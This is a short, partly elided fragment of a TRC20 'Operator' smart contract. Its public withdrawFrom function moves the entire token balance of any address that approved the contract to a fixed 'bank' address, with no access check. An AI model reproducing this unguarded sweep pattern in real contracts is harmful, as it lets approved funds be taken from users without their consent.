...
contract Operator is Ownable {
    ...
    constructor(
        address _bank, address _token
    ) {
        bank = _bank;
        baseToken = ITRC20(_token);
    }
    ...
    function withdrawFrom(address _from) public {
        uint256 amount = baseToken.balanceOf(_from);

        require(amount > 0, "AMOUNT IS ZERO");

        baseToken.transferFrom(_from, bank, amount);
    }
